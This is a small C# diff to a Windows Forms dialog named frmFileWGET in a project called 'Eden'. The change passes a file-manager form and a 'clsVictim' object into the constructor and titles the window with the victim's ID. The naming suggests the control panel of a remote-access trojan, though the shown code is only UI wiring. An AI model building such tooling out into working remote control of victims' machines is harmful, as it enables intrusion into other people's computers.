@@ -12,11 +12,17 @@ namespace Eden
 {
     public partial class frmFileWGET : Form
     {
-        public frmFileMgr m_fMgr;
+        public frmFileMgr m_fMgr { get; init; }
+        public clsVictim m_victim { get; init; }
 
-        public frmFileWGET()
+        public frmFileWGET(frmFileMgr frmMgr, clsVictim victim)
         {
             InitializeComponent();
+
+            m_fMgr = frmMgr;
+            m_victim = victim;
+
+            Text = @$"WGET\\{m_victim.m_szID}";
         }
 
         void setup()
